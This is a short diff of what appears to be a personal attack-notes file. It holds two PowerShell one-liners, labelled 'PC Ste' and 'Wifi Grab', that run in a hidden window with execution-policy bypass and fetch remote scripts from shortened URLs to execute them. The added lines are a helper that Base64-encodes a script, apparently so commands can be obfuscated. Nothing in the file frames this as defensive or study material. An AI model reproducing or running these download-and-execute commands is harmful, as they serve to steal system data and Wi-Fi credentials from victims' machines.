@@ -1,2 +1,11 @@
 PC Ste powershell -w h -NoP -Ep Bypass; irm https://rb.gy/sz67pn | iex
 Wifi Grab powershell -w h -NoP -Ep Bypass; irm https://rb.gy/bk5rpv | iex
+
+$script = @'
+
+  
+'@
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encoded = [Convert]::ToBase64String($bytes)
+Write-Output $encoded
